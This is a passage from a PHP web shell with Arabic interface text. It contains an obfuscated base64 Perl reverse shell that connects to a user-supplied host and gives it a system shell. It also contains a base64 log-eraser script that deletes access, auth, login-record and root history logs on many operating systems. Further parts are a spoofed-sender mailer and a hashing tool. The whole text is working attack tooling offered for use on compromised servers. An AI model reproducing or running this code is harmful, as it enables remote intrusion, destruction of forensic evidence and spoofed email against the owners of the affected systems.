          &lt;option&gt;lampp&lt;/option&gt;
          &lt;option&gt;debian&lt;/option&gt;
          &lt;option&gt;freebsd&lt;/option&gt;
          &lt;option&gt;misc&lt;/option&gt;
        &lt;/select&gt;&lt;br&gt;&lt;input type='submit' name='runer' value='ãÓÍ'&gt;&lt;/table&gt;";
        }
       
// ÇáÅÊÕÇá ÇáÚßÓí
if(isset($_POST['connsub']))
{
$sources = base64_decode("CiMhL3Vzci9iaW4vcGVybAp1c2UgU29ja2V0OwoKJGV4ZWN1dGU9J2VjaG8gIkhlcmUgaSBhbSI7ZWNobyAiYHVuYW1lIC1hYCI7ZWNobyAiYHVwdGltZWAiOy9iaW4vc2gnOwoKJHRhcmdldD0kQVJHVlswXTsKJHBvcnQ9JEFSR1ZbMV07CiRpYWRkcj1pbmV0X2F0b24oJHRhcmdldCkgfHwgZGllKCJFcnJvcjogJCFcbiIpOwokcGFkZHI9c29ja2FkZHJfaW4oJHBvcnQsICRpYWRkcikgfHwgZGllKCJFcnJvcjogJCFcbiIpOwokcHJvdG89Z2V0cHJvdG9ieW5hbWUoJ3RjcCcpOwpzb2NrZXQoU09DS0VULCBQRl9JTkVULCBTT0NLX1NUUkVBTSwgJHByb3RvKSB8fCBkaWUoIkVycm9yOiAkIVxuIik7CmNvbm5lY3QoU09DS0VULCAkcGFkZHIpIHx8IGRpZSgiRXJyb3I6ICQhXG4iKTsKb3BlbihTVERJTiwgIj4mU09DS0VUIik7Cm9wZW4oU1RET1VULCAiPiZTT0NLRVQiKTsKb3BlbihTVERFUlIsICI+JlNPQ0tFVCIpOwpzeXN0ZW0oJGV4ZWN1dGUpOwpjbG9zZShTVERJTik7CmNsb3NlKFNURE9VVCk7IA==");
$openz = fopen("cbs.pl", "w+")or die("Error");
fwrite($openz, $sources)or die("Error");
fclose($openz);
$aids = passthru("perl cbs.pl ".$_POST['connhost']." ".$_POST['connport']);
unlink("cbs.pl");
}
if(isset($_POST['connsub'])) { echo "&lt;tr&gt;&lt;td&gt;&lt;p align=center&gt;&lt;font color='lightgreen' face='Tahoma' size='5'&gt;Êã ÇáÃÊÕÇá íäÌÇÍ&lt;/font&gt;&lt;/p&gt;"; }

        // ãÓÍ ÇáÃËÑ
if(isset($_POST['runer']))
{
echo "&lt;tr&gt;&lt;td&gt;&lt;center&gt;&lt;textarea cols='30' rows='2'&gt;";
$erase = base64_decode("IyF1c3IvYmluL3BlcmwKIyBQb3dlcmVkIEJ5IElsbHV6MW9uCiMgTW9kZGVkIGJ5IENvZDNyWiBmb3IgQ29kM3JaIFNoZWxsCiAgICAgICBjaG9tcCgkb3MgPSAkQVJHVlswXSk7CgogICAgICAgICAgICAgICAgaWYoJG9zIGVxICJtaXNjIil7ICNJZiBtaXNjIHR5cGVkLCBkbyB0aGUgZm9sbG93aW5nIGFuZCBzdGFydCBicmFja2V0cwogICAgICAgICAgICAgcHJpbnQgIlsrXW1pc2MgU2VsZWN0ZWQuLi5cbiI7ICAgCiAgICAgICAgICAgICBzbGVlcCAxOwogICAgICAgICAgICAgcHJpbnQgIjx0cj5bK11Mb2dzIExvY2F0ZWQuLi5cbiI7CiAgICAgICAgICAgICBzbGVlcCAxOwogICAgICAgICAgICAgJGEgPSB1bmxpbmsgQG1pc2M7ICAgCiAgICAgICAgICAgICBzbGVlcCAxOwoJCQkgCiAgICAgICAgICAgIGlmKCRhKSB7IHByaW50ICJbK11Mb2dzIFN1Y2Nlc3NmdWxseSBEZWxldGVkLi4uXG4iOyB9CgkJCWVsc2UgeyBwcmludCAiWy1dRXJyb3IiOyB9CiAgICAgICAgICAgICAgfQoKICAgICAgICAgICAgICAgIGlmKCRvcyBlcSAib3BlbmJzZCIpeyAjSWYgb3BlbmJzZCB0eXBlZCwgZG8gdGhlIGZvbGxvd2luZyBhbmQgc3RhcnQgYnJhY2tldHMKICAgICAgICAgICAgIHByaW50ICJbK11vcGVuYnNkIFNlbGVjdGVkLi4uXG4iOwogICAgICAgICAgICAgc2xlZXAgMTsKICAgICAgICAgICAgIHByaW50ICJbK11Mb2dzIExvY2F0ZWQuLi5cbiI7ICAgCiAgICAgICAgICAgICBzbGVlcCAxOwogICAgICAgICAgICAgJGIgPSB1bmxpbmsgQG9wZW5ic2Q7ICAgCiAgICAgICAgICAgICBzbGVlcCAxOwogICAgICAgICAgICBpZigkYikge3ByaW50ICJbK11Mb2dzIFN1Y2Nlc3NmdWxseSBEZWxldGVkLi4uXG4iOyAgIH0KCQkJZWxzZSB7IHByaW50ICJbLV1FcnJvciI7IH0KICAgICAgICAgICAgICB9CgogICAgICAgICAgICAgICAgaWYoJG9zIGVxICJmcmVlYnNkIil7ICNJZiBmcmVlYnNkIHR5cGVkLCBkbyB0aGUgZm9sbG93aW5nIGFuZCBzdGFydCBicmFja2V0cwogICAgICAgICAgICAgcHJpbnQgIlsrXWZyZWVic2QgU2VsZWN0ZWQuLi5cbiI7ICAgCiAgICAgICAgICAgICBzbGVlcCAxOwogICAgICAgICAgICAgcHJpbnQgIlsrXUxvZ3MgTG9jYXRlZC4uLlxuIjsgICAKICAgICAgICAgICAgIHNsZWVwIDE7CiAgICAgICAgICAgICAkYyA9IHVubGluayBAZnJlZWJzZDsgICAKICAgICAgICAgICAgIHNsZWVwIDE7CiAgICAgICAgICAgICBpZigkYykgeyBwcmludCAiWytdTG9ncyBTdWNjZXNzZnVsbHkgRGVsZXRlZC4uLlxuIjsgfQoJCQkgZWxzZSB7IHByaW50ICJbLV1FcnJvciI7IH0KICAgICAgICAgICAgICB9CgogICAgICAgICAgICAgICAgaWYoJG9zIGVxICJkZWJpYW4iKXsgI0lmIERlYmlhbiB0eXBlZCwgZG8gdGhlIGZvbGxvd2luZyBhbmQgc3RhcnQgYnJhY2tldHMKICAgICAgICAgICAgIHByaW50ICJbK11kZWJpYW4gU2VsZWN0ZWQuLi5cbiI7CiAgICAgICAgICAgICBzbGVlcCAxOwogICAgICAgICAgICAgcHJpbnQgIlsrXUxvZ3MgTG9jYXRlZC4uLlxuIjsKICAgICAgICAgICAgIHNsZWVwIDE7CiAgICAgICAgICAgICAkZCA9IHVubGluayBAZGViaWFuOyAgIAogICAgICAgICAgICAgc2xlZXAgMTsKICAgICAgICAgICAgIGlmKCRkKSB7IHByaW50ICJbK11Mb2dzIFN1Y2Nlc3NmdWxseSBEZWxldGVkLi4uXG4iOyB9CgkJCSAgZWxzZSB7IHByaW50ICJbLV1FcnJvciI7IH0KICAgICAgICAgICAgICB9CgogICAgICAgICAgICAgICAgaWYoJG9zIGVxICJzdXNlIil7ICNJZiBzdXNlIHR5cGVkLCBkbyB0aGUgZm9sbG93aW5nIGFuZCBzdGFydCBicmFja2V0cwogICAgICAgICAgICAgcHJpbnQgIlsrXXN1c2UgU2VsZWN0ZWQuLi5cbiI7CiAgICAgICAgICAgICBzbGVlcCAxOwogICAgICAgICAgICAgcHJpbnQgIlsrXUxvZ3MgTG9jYXRlZC4uLlxuIjsKICAgICAgICAgICAgIHNsZWVwIDE7CiAgICAgICAgICAgICAkZSA9IHVubGluayBAc3VzZTsgICAKICAgICAgICAgICAgIHNsZWVwIDE7CiAgICAgICAgICAgIGlmKCRlKSB7IHByaW50ICJbK11Mb2dzIFN1Y2Nlc3NmdWxseSBEZWxldGVkLi4uXG4iOyB9CgkJCSBlbHNlIHsgcHJpbnQgIlstXUVycm9yIjsgfQogICAgICAgICAgICAgIH0KCiAgICAgICAgICAgICAgICBpZigkb3MgZXEgInNvbGFyaXMiKXsgI0lmIHNvbGFyaXMgdHlwZWQsIGRvIHRoZSBmb2xsb3dpbmcgYW5kIHN0YXJ0IGJyYWNrZXRzCiAgICAgICAgICAgICBwcmludCAiWytdc29sYXJpcyBTZWxlY3RlZC4uLlxuIjsKICAgICAgICAgICAgIHNsZWVwIDE7CiAgICAgICAgICAgICBwcmludCAiWytdTG9ncyBMb2NhdGVkLi4uXG4iOwogICAgICAgICAgICAgc2xlZXAgMTsKICAgICAgICAgICAgICRmID0gdW5saW5rIEBzb2xhcmlzOwogICAgICAgICAgICAgc2xlZXAgMTsKICAgICAgICAgICAgIGlmKCRmKSB7cHJpbnQgIlsrXUxvZ3MgU3VjY2Vzc2Z1bGx5IERlbGV0ZWQuLi5cbiI7IH0KCQkJIGVsc2UgeyBwcmludCAiWy1dRXJyb3IiOyB9CiAgICAgICAgICAgICAgfQoKICAgICAgICAgICAgICAgIGlmKCRvcyBlcSAibGFtcHAiKXsgI0lmIGxhbXBwIHR5cGVkLCBkbyB0aGUgZm9sbG93aW5nIGFuZCBzdGFydCBicmFja2V0cwogICAgICAgICAgICAgcHJpbnQgIlsrXUxhbXBwIFNlbGVjdGVkLi4uXG4iOwogICAgICAgICAgICAgc2xlZXAgMTsKICAgICAgICAgICAgIHByaW50ICJbK11Mb2dzIExvY2F0ZWQuLi5cbiI7CiAgICAgICAgICAgICBzbGVlcCAxOwogICAgICAgICAgICAgJGcgPSB1bmxpbmsgQGxhbXBwOwogICAgICAgICAgICAgc2xlZXAgMTsKICAgICAgICAgICAgaWYoJGcpIHsgcHJpbnQgIlsrXUxvZ3MgU3VjY2Vzc2Z1bGx5IERlbGV0ZWQuLi5cbiI7IH0KCQkgICAgZWxzZSB7IHByaW50ICJbLV1FcnJvciI7IH0KICAgICAgICAgICAgICB9CgogICAgICAgICAgICAgICAgaWYoJG9zIGVxICJyZWRoYXQiKXsgI0lmIHJlZGhhdCB0eXBlZCwgZG8gdGhlIGZvbGxvd2luZyBhbmQgc3RhcnQgYnJhY2tldHMKICAgICAgICAgICAgIHByaW50ICJbK11SZWQgSGF0IExpbnV4L01hYyBPUyBYIFNlbGVjdGVkLi4uXG4iOwogICAgICAgICAgICAgc2xlZXAgMTsKICAgICAgICAgICAgIHByaW50ICJbK11Mb2dzIExvY2F0ZWQuLi5cbiI7CiAgICAgICAgICAgICBzbGVlcCAxOwogICAgICAgICAgICAgJGggPSB1bmxpbmsgQHJlZGhhdDsKICAgICAgICAgICAgIHNsZWVwIDE7CiAgICAgICAgICAgICBpZigkaCkgeyBwcmludCAiWytdTG9ncyBTdWNjZXNzZnVsbHkgRGVsZXRlZC4uLlxuIjsgfQoJCQkgIGVsc2UgeyBwcmludCAiWy1dRXJyb3IiOyB9CiAgICAgICAgICAgICAgfQogICAgICAgCiAgICAgICAgICAgICAgICBpZigkb3MgZXEgImxpbnV4Iil7ICNJZiBsaW51eCB0eXBlZCwgZG8gdGhlIGZvbGxvd2luZyBhbmQgc3RhcnQgYnJhY2tldHMKICAgICAgICAgICAgIHByaW50ICJbK11MaW51eCBTZWxlY3RlZC4uLlxuIjsgICAKICAgICAgICAgICAgIHNsZWVwIDE7CiAgICAgICAgICAgICBwcmludCAiWytdTG9ncyBMb2NhdGVkLi4uXG4iOwogICAgICAgICAgICAgc2xlZXAgMTsKICAgICAgICAgICAgICRpID0gdW5saW5rIEBsaW51eDsKICAgICAgICAgICAgIHNsZWVwIDE7CgkJCWlmKCRpKSB7IHByaW50ICJbK11Mb2dzIFN1Y2Nlc3NmdWxseSBEZWxldGVkLi4uXG4iO30gCgkJCWVsc2UgeyBwcmludCAiWy1dRXJyb3IiOyB9CgkJfSAgICAgIAogICAgICAgICAgICAgCiAgICAgICAgICAgICAgaWYoJG9zIGVxICJzdW5vcyIpeyAjSWYgc3Vub3MgdHlwZWQsIGRvIHRoZSBmb2xsb3dpbmcgYW5kIHN0YXJ0IGJyYWNrZXRzCiAgICAgICAgICAgICAgcHJpbnQgIlsrXVN1bk9TIFNlbGVjdGVkLi4uXG4iOwogICAgICAgICAgICAgIHNsZWVwIDE7CiAgICAgICAgICAgICAgcHJpbnQgIlsrXUxvZ3MgTG9jYXRlZC4uLlxuIjsKICAgICAgICAgICAgICBzbGVlcCAxOwogICAgICAgICAgICAgICRsID0gdW5saW5rIEBzdW5vczsKICAgICAgICAgICAgICBpZigkbCkgeyBwcmludCAiWytdTG9ncyBTdWNjZXNzZnVsbHkgRGVsZXRlZC4uLlxuIjsgfQoJCQkgIGVsc2UgeyBwcmludCAiWy1dRXJyb3IiOyB9CiAgICAgICAgICAgICAgfSAgIAogICAgICAgICAgICAgICAKICAgICAgICAgICAgICBpZigkb3MgZXEgImFpeCIpeyAjSWYgYWl4IHR5cGVkLCBkbyB0aGUgZm9sbG93aW5nIGFuZCBzdGFydCBicmFja2V0cwogICAgICAgICAgICAgICAgIHByaW50ICJbK11BaXggU2VsZWN0ZWQuLi5cbiI7CiAgICAgICAgICAgICAgICAgc2xlZXAgMTsKICAgICAgICAgICAgICBwcmludCAiWytdTG9ncyBMb2NhdGVkLi4uXG4iOwogICAgICAgICAgICAgIHNsZWVwIDE7CiAgICAgICAgICAgICAgJG0gPSB1bmxpbmsgQGFpeDsKICAgICAgICAgICAgICBpZigkbSkgeyBwcmludCAiWytdTG9ncyBTdWNjZXNzZnVsbHkgRGVsZXRlZC4uLlxuIjsgfQoJCQkgICBlbHNlIHsgcHJpbnQgIlstXUVycm9yIjsgfQogICAgICAgICAgICAgIH0KICAgICAgICAgICAgIAogICAgICAgICAgICAgIGlmKCRvcyBlcSAiaXJpeCIpeyAjSWYgaXJpeCB0eXBlZCwgZG8gdGhlIGZvbGxvd2luZyBhbmQgc3RhcnQgYnJhY2tldAogICAgICAgICAgICAgIHByaW50ICJbK11Jcml4IFNlbGVjdGVkLi4uXG4iOwogICAgICAgICAgICAgIHNsZWVwIDE7CiAgICAgICAgICAgICAgcHJpbnQgIlsrXUxvZ3MgTG9jYXRlZC4uLlxuIjsKICAgICAgICAgICAgICBzbGVlcCAxOwogICAgICAgICAgICAgICRuID0gdW5saW5rIEBpcml4OyAgIAogICAgICAgICAgICAgIGlmKCRuKSB7IHByaW50ICJbK11Mb2dzIFN1Y2Nlc3NmdWxseSBEZWxldGVkLi4uXG4iOyB9CgkJCSAgZWxzZSB7IHByaW50ICJbLV1FcnJvciI7IH0KICAgICAgICAgICAgICB9CgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICNNaXNjIExvZyBMb2NhdGlvbnMgICAKICAgICAgeyAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgIEBtaXNjID0gKCIvZXRjL2h0dHBkL2xvZ3MvYWNjZXNzLmxvZyIsICIvZXRjL2h0dHBkL2xvZ3MvZXJyb3IubG9nIiwiL2V0Yy9odHRwZC9sb2dzL2FjY2Vzc19sb2ciLAogICAgICAgICAgICAiL2V0Yy9odHRwZC9sb2dzL2Vycm9yX2xvZyIsIi91c3IvbG9jYWwvYXBhY2hlL2xvZ3MvYWNjZXNzX2xvZyIsIi91c3IvbG9jYWwvYXBhY2hlL2xvZ3MvZXJyb3JfbG9nIiwKICAgICAgICAgICAgIi91c3IvbG9jYWwvYXBhY2hlL2xvZ3MvYWNjZXNzLmxvZyIsIi91c3IvbG9jYWwvYXBhY2hlL2xvZ3MvZXJyb3IubG9nIiwiL3Zhci9sb2cvYXBhY2hlL2FjY2Vzc19sb2ciLAogICAgICAgICAgICAiL3Zhci9sb2cvYXBhY2hlL2Vycm9yX2xvZyIsIi92YXIvbG9nL2FwYWNoZS9hY2Nlc3MubG9nIiwiL3Zhci9sb2cvYXBhY2hlL2Vycm9yLmxvZyIsIi92YXIvbG9nL2FjY2Vzc19sb2ciLAogICAgICAgICAgICAiL3Zhci9sb2cvZXJyb3JfbG9nIiwiL3Zhci93d3cvbG9ncy9lcnJvci5sb2ciLCIvdmFyL3d3dy9sb2dzL2FjY2Vzcy5sb2ciLCIvdmFyL3d3dy9sb2dzL2Vycm9yX2xvZyIsCiAgICAgICAgICAgICIvdmFyL3d3dy9sb2dzL2FjY2Vzc19sb2ciKQogICAgICAgICB9CgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAjTG9ncyBvZiBPcGVuQlNEIFN5c3RlbXMKICAgCiAgICAgIHsKICAgICAgIEBvcGVuYnNkID0gKCIvdmFyL3d3dy9sb2cvYWNjZXNzX2xvZyIsICIvdmFyL3d3dy9sb2cvZXJyb3JfbG9nIikKICAgICAgICAgICB9CgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAjTG9ncyBvZiBGcmVlQlNEIFN5c3RlbXMKICAgCiAgICAgIHsKICAgICAgIEBmcmVlYnNkID0gKCIvdXNyL2xvY2FsL2V0Yy9odHRwZC9sb2dzL2FjY2Vzc19sb2ciLCAiL3Vzci9sb2NhbC9ldGMvaHR0cGQvbG9ncy9lcnJvcl9sb2ciKQogICAgICAgICAgIH0KCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICNMb2dzIG9mIERlYmlhbiBTeXN0ZW1zCiAgIAogICAgICB7CiAgICAgICBAZGViaWFuID0gKCIvdmFyL2xvZy9hcGFjaGUvYWNjZXNzLmxvZyIsICIvdmFyL2xvZy9hcGFjaGUvZXJyb3IubG9nIiwKICAgICAgICIvdmFyL2xvZy9hcGFjaGUtc3NsL2Vycm9yLmxvZyIsICIvdmFyL2xvZy9hcGFjaGUtc3NsL2FjY2Vzcy5sb2ciKQogICAgICAgICAgIH0gICAKCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICNMb2dzIG9mIFN1U0UgTGludXggU3lzdGVtcwogICAKICAgICAgewogICAgICAgQHN1c2UgPSAoIi92YXIvbG9nL2h0dHBkL2FjY2Vzc19sb2ciLCAiL3Zhci9sb2cvaHR0cGQvZXJyb3JfbG9nIikKICAgICAgICAgICB9CgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAjTG9ncyBvZiBTb2xhcmlzIFN5c3RlbXMKICAgCiAgICAgIHsgICAKICAgICAgIEBzb2xhcmlzID0gKCIvdmFyL2FwYWNoZS9sb2dzL2FjY2Vzc19sb2ciLCAiL3Zhci9hcGFjaGUvbG9ncy9lcnJvcl9sb2ciKQogICAgICAgICAgIH0KCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICNMb2dzIG9mIExhbXBwIFN5c3RlbXMKICAgCiAgICAgIHsKICAgICAgIEBsYW1wcCA9ICgiL29wdC9sYW1wcC9sb2dzL2Vycm9yX2xvZyIsICIvb3B0L2xhbXBwL2xvZ3MvYWNjZXNzX2xvZyIpCiAgICAgICAgICAgfQoKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgI0xvZ3Mgb2YgUmVkIEhhdCwgTWFjIE9TIFggU3lzdGVtcwogICAKICAgICAgewogICAgICAgQHJlZGhhdCA9ICgiL3Zhci9sb2cvaHR0cGQvYWNjZXNzX2xvZyIsICIvdmFyL2xvZy9odHRwZC9lcnJvcl9sb2ciKQogICAgICAgICAgIH0KICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICNMb2dzIG9mIElyaXggU3lzdGVtcwogICAKICAgICAgewogICAgICAgQGlyaXggPSAoIi92YXIvYWRtL1NZU0xPRyIsICIvdmFyL2FkbS9zdWxvZyIsICIvdmFyL2FkbS91dG1wIiwgIi92YXIvYWRtL3V0bXB4IiwKICAgICAgICAgICAgICAiL3Zhci9hZG0vd3RtcCIsICIvdmFyL2FkbS93dG1weCIsICIvdmFyL2FkbS9sYXN0bG9nLyIsCiAgICAgICAgICAgICIvdXNyL3Nwb29sL2xwL2xvZyIsICIvdmFyL2FkbS9scC9scC1lcnJzIiwgIi91c3IvbGliL2Nyb24vbG9nIiwKICAgICAgICAgICAgIi92YXIvYWRtL2xvZ2lubG9nIiwgIi92YXIvYWRtL3BhY2N0IiwgIi92YXIvYWRtL2R0bXAiLAogICAgICAgICAgICAiL3Zhci9hZG0vYWNjdC9zdW0vbG9naW5sb2ciLCAidmFyL2FkbS9YMG1zZ3MiLCAiL3Zhci9hZG0vY3Jhc2gvdm1jb3JlIiwKICAgICAgICAgICAgIi92YXIvYWRtL2NyYXNoL3VuaXgiKQogICAgICAgICAgIH0KCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgI0xvZyBzb2YgQWl4IFN5c3RlbXMKICAgICAgeyAgIAogICAgICBAYWl4ID0gKCIvdmFyL2FkbS9wYWNjdCIsICIvdmFyL2FkbS93dG1wIiwgIi92YXIvYWRtL2R0bXAiLCAiL3Zhci9hZG0vcWFjY3QiLCAgIAogICAgICAgICAgICAgICAiL3Zhci9hZG0vc3Vsb2ciLCAiL3Zhci9hZG0vcmFzL2VycmxvZyIsICIvdmFyL2FkbS9yYXMvYm9vdGxvZyIsCiAgICAgICAgICAgICAgICIvdmFyL2FkbS9jcm9uL2xvZyIsICIvZXRjL3V0bXAiLCAiL2V0Yy9zZWN1cml0eS9sYXN0bG9nIiwKICAgICAgICAgICAgICAgIi9ldGMvc2VjdXJpdHkvZmFpbGVkbG9naW4iLCAidXNyL3Nwb29sL21xdWV1ZS9zeXNsb2ciKSAgIAogICAgICAgICB9CgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICNMb2dzIG9mIFN1bk9TIFN5c3RlbXMgICAKICAgICAgeyAgICAgICAgICAgICAgICAgICAgIAogICAgICBAc3Vub3MgPSAoIi92YXIvYWRtL21lc3NhZ2VzIiwgIi92YXIvYWRtL2FjdWxvZ3MiLCAiL3Zhci9hZG0vYWN1bG9nIiwKICAgICAgICAgICAgICAgICAiL3Zhci9hZG0vc3Vsb2ciLCAiL3Zhci9hZG0vdm9sZC5sb2ciLCAiL3Zhci9hZG0vd3RtcCIsCiAgICAgICAgICAgICAgICAgIi92YXIvYWRtL3d0bXB4IiwgIi92YXIvYWRtL3V0bXAiLCAiL3Zhci9hZG0vdXRtcHgiLAogICAgICAgICAgICAgICAgICIvdmFyL2FkbS9sb2cvYXNwcHAubG9nIiwgIi92YXIvbG9nL3N5c2xvZyIsCiAgICAgICAgICAgICAgICAgIi92YXIvbG9nL1BPUGxvZyIsICIvdmFyL2xvZy9hdXRobG9nIiwgIi92YXIvYWRtL3BhY2N0IiwKICAgICAgICAgICAgICAgICAiL3Zhci9scC9sb2dzL2xwc2NoZWQiLCAiL3Zhci9scC9sb2dzL3JlcXVlc3RzIiwKICAgICAgICAgICAgICAiL3Zhci9jcm9uL2xvZ3MiLCAiL3Zhci9zYWYvX2xvZyIsICIvdmFyL3NhZi9wb3J0L2xvZyIpCiAgICAgICAgIH0gICAgIAoKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAjTG9ncyBvZiBMaW51eCBTeXN0ZW1zICAgICAgIAogICAgICB7ICAgICAKICAgICAgIEBsaW51eCA9ICgiL3Zhci9sb2cvbGFzdGxvZyIsICIvdmFyL2xvZy90ZWxuZXRkIiwgIi92YXIvcnVuL3V0bXAiLAogICAgICAgICAgICAgICAgICIvdmFyL2xvZy9zZWN1cmUiLCIvcm9vdC8ua3NoX2hpc3RvcnkiLCAiL3Jvb3QvLmJhc2hfaGlzdG9yeSIsCiAgICAgICAgICAgICAgICAgIi9yb290Ly5iYXNoX2xvZ3V0IiwgIi92YXIvbG9nL3d0bXAiLCAiL2V0Yy93dG1wIiwKICAgICAgICAgICAgICAgICAiL3Zhci9ydW4vdXRtcCIsICIvZXRjL3V0bXAiLCAiL3Zhci9sb2ciLCAiL3Zhci9hZG0iLAogICAgICAgICAgICAgICAgICIvdmFyL2FwYWNoZS9sb2ciLCAiL3Zhci9hcGFjaGUvbG9ncyIsICIvdXNyL2xvY2FsL2FwYWNoZS9sb2dzIiwKICAgICAgICAgICAgICAgICAiL3Vzci9sb2NhbC9hcGFjaGUvbG9ncyIsICIvdmFyL2xvZy9hY2N0IiwgIi92YXIvbG9nL3hmZXJsb2ciLAogICAgICAgICAgICAgICAgICIvdmFyL2xvZy9tZXNzYWdlcy8iLCAiL3Zhci9sb2cvcHJvZnRwZC94ZmVybG9nLmxlZ2FjeSIsCiAgICAgICAgICAgICAgICAgIi92YXIvbG9nL3Byb2Z0cGQueGZlcmxvZyIsICIvdmFyL2xvZy9wcm9mdHBkLmFjY2Vzc19sb2ciLAogICAgICAgICAgICAgICAgICIvdmFyL2xvZy9odHRwZC9lcnJvcl9sb2ciLCAiL3Zhci9sb2cvaHR0cHNkL3NzbF9sb2ciLAogICAgICAgICAgICAgICAgICIvdmFyL2xvZy9odHRwc2Qvc3NsLmFjY2Vzc19sb2ciLCAiL2V0Yy9tYWlsL2FjY2VzcyIsCiAgICAgICAgICAgICAgICAgIi92YXIvbG9nL3FtYWlsIiwgIi92YXIvbG9nL3NtdHBkIiwgIi92YXIvbG9nL3NhbWJhIiwKICAgICAgICAgICAgICAgICAiL3Zhci9sb2cvc2FtYmEubG9nLiVtIiwgIi92YXIvbG9jay9zYW1iYSIsICIvcm9vdC8uWGF1dGhvcml0eSIsCiAgICAgICAgICAgICAgICAgIi92YXIvbG9nL3BvcGxvZyIsICIvdmFyL2xvZy9uZXdzLmFsbCIsICIvdmFyL2xvZy9zcG9vbGVyIiwKICAgICAgICAgICAgICAgICAiL3Zhci9sb2cvbmV3cyIsICIvdmFyL2xvZy9uZXdzL25ld3MiLCAiL3Zhci9sb2cvbmV3cy9uZXdzLmFsbCIsCiAgICAgICAgICAgICAgICAgIi92YXIvbG9nL25ld3MvbmV3cy5jcml0IiwgIi92YXIvbG9nL25ld3MvbmV3cy5lcnIiLCAiL3Zhci9sb2cvbmV3cy9uZXdzLm5vdGljZSIsCiAgICAgICAgICAgICAgICAgIi92YXIvbG9nL25ld3Mvc3Vjay5lcnIiLCAiL3Zhci9sb2cvbmV3cy9zdWNrLm5vdGljZSIsCiAgICAgICAgICAgICAgICAgIi92YXIvc3Bvb2wvdG1wIiwgIi92YXIvc3Bvb2wvZXJyb3JzIiwgIi92YXIvc3Bvb2wvbG9ncyIsICIvdmFyL3Nwb29sL2xvY2tzIiwKICAgICAgICAgICAgICAgICAiL3Vzci9sb2NhbC93d3cvbG9ncy90aHR0cGRfbG9nIiwgIi92YXIvbG9nL3RodHRwZF9sb2ciLAogICAgICAgICAgICAgICAgICIvdmFyL2xvZy9uY2Z0cGQvbWlzY2xvZy50eHQiLCAiL3Zhci9sb2cvbmN0ZnBkLmVycnMiLAogICAgICAgICAgICAgICAgICIvdmFyL2xvZy9hdXRoIikKICAgICAgICAgfQogICAgICAgICAKICAgICAgCiAKICAg");
$openp = fopen("logseraser.pl", "w+")or die("Error");
fwrite($openp, $erase)or die("Error");
fclose($openp);
$aidx = passthru("perl logseraser.pl ".$_POST['functionp']);
unlink("logseraser.pl");
echo "&lt;/textarea&gt;";
}
elseif(isset($_POST['mail']))
{
echo "&lt;form method='post' action=''&gt;
&lt;td valign=top&gt;&lt;center&gt;&lt;font face='Verdana' size='2'&gt;(html) ÇáÑÓÇáÉ áÜ ÇáÅíãíá íÏÚã áÛÉ åÊãá&lt;/font&gt;&lt;/center&gt;
&lt;center&gt;&lt;font face='Verdana' size='1'&gt;Çáì:&lt;br&gt;
&lt;input type='text' size='19' name='mto'&gt;&lt;br&gt;
Çáì:&lt;br&gt;
&lt;input type='text' size='19' name='mfrom'&gt;&lt;br&gt;
ÇáãæÖæÚ:&lt;br&gt;
&lt;input type='text' size='19' name='mobj'&gt;&lt;br&gt;
ÇáãÍÊæì:&lt;br&gt;
&lt;textarea name='mtext' cols=20 rows=4&gt;&lt;/textarea&gt;&lt;br&gt;
&lt;br&gt;&lt;input type='submit' value='ÅÑÓá' name='senm'&gt;
&lt;/form&gt;&lt;/table&gt;&lt;br&gt;";}
if(isset($_POST['senm']))
{
//ÇÑÓÇá ÑÓÇáÉ   &lt;- webcheatsheet.com
$to = $_POST['mto'];
$subject = $_POST['mobj'];
$contentz = $_POST['mtext']."&lt;!--";
$random_hash = md5(date('r', time()));
$headers = "From: ".$_POST['mfrom']."rnReply-To: ".$_POST['mfrom'];
$headers .= "rnContent-Type: multipart/alternative; boundary='PHP-alt-".$random_hash."'";
ob_start();
?>

--PHP-alt-<?php echo $random_hash; ?>
Content-Type: text/html; charset="windows-1256"
Content-Transfer-Encoding: 7bit

<?  echo "$contentz"; ?>
--PHP-alt-<?php echo $random_hash; ?>--
<?
$message = ob_get_clean();

$mail = @mail( $to, $subject, $message, $headers );

if($mail) { echo "&lt;br&gt;&lt;td valign=top&gt;
&lt;center&gt;&lt;font color='green' size='1'&gt;Êã ÇáÅÑÓÇá&lt;/font&gt;&lt;/center&gt;&lt;/table&gt;"; }
else { echo "&lt;br&gt;&lt;td valign=top&gt;
&lt;center&gt;&lt;font color='red' size='1'&gt;áã íÊã ÇáÅÑÓÇá&lt;/font&gt;&lt;/center&gt;&lt;/table&gt;"; }
}

elseif(isset($_POST['encoder'])) {
//ÇáÊÔÝíÑ 
echo "&lt;form method='post' action=''&gt;&lt;td valign=top&gt;
&lt;center&gt;&lt;font face='Verdana' size='1'&gt;: ÖÚ ÇáÈÇÓæÑÏ ÇáãÑÇÏ ÊÔÝíÑåÇ &lt;/font&gt;&lt;br&gt;&lt;textarea name='encod'&gt;&lt;/textarea&gt;&lt;br&gt;&lt;input type='submit' value='Encode' name='encode'&gt;&lt;/form&gt;&lt;/table&gt;";
}
if(isset($_POST['encode'])) { echo "&lt;td valign=top&gt;
&lt;center&gt;&lt;font face='Verdana' size='1'&gt;
MD5:   &nbsp;&nbsp;&nbsp;&nbsp;&lt;input type='text' size='35' value='".md5($_POST['encod'])."'&gt;&lt;br&gt;
Sha1:  &nbsp;&nbsp;&nbsp;&lt;input type='text' size='35' value='".sha1($_POST['encod'])."'&gt;&lt;br&gt;
Crc32: &nbsp;&nbsp;&nbsp;&lt;input type='text' size='34' value='".crc32($_POST['encod'])."'&gt;&lt;br&gt;&lt;br&gt;
Base64 Encode: &lt;input type='text' size='35' value='".base64_encode($_POST['encod'])."'&gt;&lt;br&gt;
Base64 Decode: &lt;input type='text' size='36' value='".base64_decode($_POST['encod'])."'&gt;&lt;/table&gt;";}

//ÊØÈíÞ ÇáÃæÇãÑ ãÈÓØ
